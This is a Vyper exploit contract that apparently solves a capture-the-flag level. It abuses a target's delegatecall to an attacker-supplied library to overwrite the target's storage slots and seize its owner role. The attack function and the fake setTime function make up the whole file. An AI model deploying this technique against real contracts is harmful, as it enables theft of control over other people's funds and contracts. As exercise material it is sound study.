# @version ^0.3.7

interface InstanceInterface:
    def owner() -> address: view
    def timeZone1Library() -> address: view
    def setFirstTime(_timeStamp: uint256): nonpayable

owner: immutable(address)

instance: immutable(InstanceInterface)

slot_zero: public(address)
slot_one: public(address)
slot_two: public(address)

@external
@payable
def __init__(_instance: InstanceInterface):
    owner = msg.sender
    instance = _instance
  
@external
def attack():
    assert msg.sender == owner, "!owner"
    sender: uint256 = convert(
        convert(
            self,
            uint160
        ),
        uint256
    )
    instance.setFirstTime(sender)
    assert instance.timeZone1Library() == self, "!library"
    instance.setFirstTime(0)
    assert instance.owner() == msg.sender, "!instance owner"

@external
def setTime(_time: uint256):
    self.slot_two = owner
